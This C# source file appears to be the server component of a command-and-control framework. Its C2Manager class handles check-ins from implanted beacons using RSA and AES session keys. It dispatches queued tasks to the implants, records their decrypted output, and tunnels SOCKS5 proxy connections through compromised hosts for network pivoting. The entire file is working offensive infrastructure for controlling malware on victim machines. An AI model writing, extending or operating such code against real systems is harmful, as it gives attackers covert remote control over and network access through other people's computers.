using System.Buffers.Binary;
using Google.Protobuf;
using Server.Beacons;
using Server.Core;
using Server.Listeners;
using Server.Proxy;
using Server.Tasks;
using TaskStatus = Server.Tasks.TaskStatus;

namespace Server.C2Bridge;

public sealed class C2Manager(
    IRepository<Listener> listeners,
    IRepository<Beacon> beacons,
    IBroker<Beacon> beaconBroker,
    IRepository<BeaconTask> tasks,
    TaskBroker taskBroker,
    ProxyQueue proxyQueue,
    ProxyBroker proxyBroker)
{
    public async Task<byte[]> ProcessBeaconMessage(uint listenerId, byte[] data, CancellationToken ct)
    {
        using var ms = new MemoryStream(data);
        using var br = new BinaryReader(ms);

        do
        {
            // read the callback type
            var bType = br.ReadBytes(sizeof(uint));
            var callbackType = BinaryPrimitives.ReadInt32BigEndian(bType.AsSpan());

            // read task / connection id
            var bId = br.ReadBytes(sizeof(uint));
            var taskId = BinaryPrimitives.ReadUInt32BigEndian(bId.AsSpan());

            // read data length
            var bLength = br.ReadBytes(sizeof(int));
            var length = BinaryPrimitives.ReadInt32BigEndian(bLength.AsSpan());

            // read the message
            var message = br.ReadBytes(length);

            switch (callbackType)
            {
                case 0x1: // beacon checkin
                {
                    var beacon = await HandleBeaconCheckin(listenerId, message, ct);

                    if (beacon is null)
                        break;

                    return await GetOutboundData(beacon, ct);
                }

                case (int)TaskType.Socks5:
                {
                    var bComplete = br.ReadBytes(sizeof(int));
                    var complete = BinaryPrimitives.ReadInt32BigEndian(bComplete.AsSpan());

                    await HandleProxyCallback(taskId, message, complete, ct);

                    break;
                }

                default: // regular task output
                {
                    var bComplete = br.ReadBytes(sizeof(int));
                    var complete = BinaryPrimitives.ReadInt32BigEndian(bComplete.AsSpan());

                    await HandleBeaconOutput(callbackType, taskId, message, complete, ct);

                    break;
                }
            }

        } while (ms.Position < ms.Length);

        return [];
    }

    private async Task<Beacon?> HandleBeaconCheckin(uint listenerId, byte[] data, CancellationToken ct)
    {
        var listener = await listeners.GetByIdAsync(listenerId, ct);

        if (listener is null)
            return null;

        var decrypted = Crypto.RsaDecrypt(data, listener.PrivateKey);
        var metadata = BeaconMetadata.Parse(decrypted);

        var beacon = await beacons.GetByIdAsync(metadata.Id, ct);

        if (beacon is null)
        {
            beacon = Beacon.Create(metadata, listener.Name);
            await beacons.AddAsync(beacon, ct);
        }
        else
        {
            beacon.CheckIn();
        }

        await beacons.UpdateAsync(beacon, ct);

        beaconBroker.Publish(beacon);

        return beacon;
    }

    private async Task<byte[]> GetOutboundData(Beacon parent, CancellationToken ct)
    {
        var spec = new ListPendingTasksSpec(parent.Id);
        var pending = await tasks.ListAsync(spec, ct);

        using var ms = new MemoryStream();

        // standard tasks
        foreach (var task in pending)
        {
            using var taskData = new MemoryStream();

            var taskId = new byte[sizeof(uint)];
            BinaryPrimitives.WriteUInt32BigEndian(taskId, task.Id);
            await taskData.WriteAsync(taskId.AsMemory(), ct);

            var taskType = new byte[sizeof(int)];
            BinaryPrimitives.WriteInt32BigEndian(taskType, (int)task.TaskType);
            await taskData.WriteAsync(taskType.AsMemory(), ct);

            var taskLen = new byte[sizeof(int)];
            BinaryPrimitives.WriteInt32BigEndian(taskLen, task.TaskData?.Length ?? 0);
            await taskData.WriteAsync(taskLen.AsMemory(), ct);

            await taskData.WriteAsync(task.TaskData?.AsMemory() ?? Array.Empty<byte>().AsMemory(), ct);

            var encrypted = Crypto.AesEncrypt(taskData.ToArray(), parent.SessionKey);

            var encryptedLen = new byte[sizeof(int)];
            BinaryPrimitives.WriteInt32BigEndian(encryptedLen, encrypted.Length);

            await ms.WriteAsync(encryptedLen.AsMemory(), ct);
            await ms.WriteAsync(encrypted.AsMemory(), ct);

            task.SetTasked();

            taskBroker.Publish(new BeaconCallback
            {
                TaskId = task.Id,
                Status = TaskStatus.Tasked,
                Output = []
            });
        }

        // Drain pending proxy frames for this beacon.
        // Serialised identically to regular tasks so the agent's existing
        // length-prefixed task loop handles them without wire-format changes.
        //
        // Encrypted blob layout:
        //   connection_id (4)  — occupies the task_id slot
        //   task_type     (4)  — TASK_SOCKS5 = 3
        //   data_len      (4)  — length of the type-specific payload below
        //   frame_type    (4)  — 0=DATA  1=CLOSE  2=CONNECT
        //   [CONNECT]  host_len(4) + host + port(4)
        //   [DATA]     raw bytes
        //   [CLOSE]    (nothing)
        var proxyFrames = proxyQueue.Drain(parent.Id);

        foreach (var frame in proxyFrames)
        {
            using var taskData = new MemoryStream();

            // connection_id in the task_id slot
            var connId = new byte[sizeof(uint)];
            BinaryPrimitives.WriteUInt32BigEndian(connId, frame.ConnectionId);
            await taskData.WriteAsync(connId.AsMemory(), ct);

            // task_type = SOCKS5
            var taskType = new byte[sizeof(int)];
            BinaryPrimitives.WriteInt32BigEndian(taskType, (int)TaskType.Socks5);
            await taskData.WriteAsync(taskType.AsMemory(), ct);

            // Build the type-specific payload so we know its length before writing
            using var payload = new MemoryStream();
            var frameTypeBytes = new byte[sizeof(int)];

            switch (frame.Type)
            {
                case ProxyFrameType.Connect:
                {
                    BinaryPrimitives.WriteInt32BigEndian(frameTypeBytes, 2); // SOCKS5_FRAME_CONNECT
                    await payload.WriteAsync(frameTypeBytes.AsMemory(), ct);

                    var hostBytes = System.Text.Encoding.UTF8.GetBytes(frame.TargetHost);
                    var hostLen = new byte[sizeof(int)];
                    BinaryPrimitives.WriteInt32BigEndian(hostLen, hostBytes.Length);
                    await payload.WriteAsync(hostLen.AsMemory(), ct);
                    await payload.WriteAsync(hostBytes.AsMemory(), ct);

                    var portBytes = new byte[sizeof(int)];
                    BinaryPrimitives.WriteInt32BigEndian(portBytes, (int)frame.TargetPort);
                    await payload.WriteAsync(portBytes.AsMemory(), ct);
                    break;
                }

                case ProxyFrameType.Close:
                {
                    BinaryPrimitives.WriteInt32BigEndian(frameTypeBytes, 1); // SOCKS5_FRAME_CLOSE
                    await payload.WriteAsync(frameTypeBytes.AsMemory(), ct);
                    break;
                }

                default: // Data
                {
                    BinaryPrimitives.WriteInt32BigEndian(frameTypeBytes, 0); // SOCKS5_FRAME_DATA
                    await payload.WriteAsync(frameTypeBytes.AsMemory(), ct);
                    await payload.WriteAsync(frame.Data.ToByteArray().AsMemory(), ct);
                    break;
                }
            }

            var payloadBytes = payload.ToArray();
            var dataLen = new byte[sizeof(int)];
            BinaryPrimitives.WriteInt32BigEndian(dataLen, payloadBytes.Length);
            await taskData.WriteAsync(dataLen.AsMemory(), ct);
            await taskData.WriteAsync(payloadBytes.AsMemory(), ct);

            var encrypted = Crypto.AesEncrypt(taskData.ToArray(), parent.SessionKey);

            var encryptedLen = new byte[sizeof(int)];
            BinaryPrimitives.WriteInt32BigEndian(encryptedLen, encrypted.Length);

            await ms.WriteAsync(encryptedLen.AsMemory(), ct);
            await ms.WriteAsync(encrypted.AsMemory(), ct);
        }

        await tasks.UpdateRangeAsync(pending, ct);
        await tasks.SaveChangesAsync(ct);

        return ms.ToArray();
    }

    private async Task HandleProxyCallback(uint connectionId, byte[] encryptedData, int complete, CancellationToken ct)
    {
        var beaconId = proxyBroker.GetBeaconId(connectionId);

        if (beaconId is null)
            return;

        var beacon = await beacons.GetByIdAsync(beaconId.Value, ct);

        if (beacon is null)
            return;

        var plaintext = Crypto.AesDecrypt(encryptedData, beacon.SessionKey);

        var frame = new ProxyFrame
        {
            BeaconId = beaconId.Value,
            ConnectionId = connectionId,
            Type = complete == 1 ? ProxyFrameType.Close : ProxyFrameType.Data,
            Data = ByteString.CopyFrom(plaintext)
        };

        proxyBroker.Publish(connectionId, frame);
    }

    private async Task HandleBeaconOutput(int callbackType, uint taskId, byte[] taskData, int complete, CancellationToken ct)
    {
        var task = await tasks.GetByIdAsync(taskId, ct);

        if (task is null)
            return;

        var beacon = await beacons.GetByIdAsync(task.BeaconId, ct);

        if (beacon is null)
            return;

        var plaintext = Crypto.AesDecrypt(taskData, beacon.SessionKey);

        var callback = new BeaconCallback
        {
            Type = callbackType,
            TaskId = taskId,
            Output = plaintext,
            Status = TaskStatus.Tasked
        };

        if (complete == 1)
        {
            callback.Status = TaskStatus.Complete;
            task.SetComplete();

            await tasks.UpdateAsync(task, ct);

            if (task.TaskType is TaskType.Exit)
            {
                beacon.SetHealth(BeaconHealth.Dead);

                await beacons.UpdateAsync(beacon, ct);
                beaconBroker.Publish(beacon);
            }

            await tasks.SaveChangesAsync(ct);
        }

        taskBroker.Publish(callback);
    }
}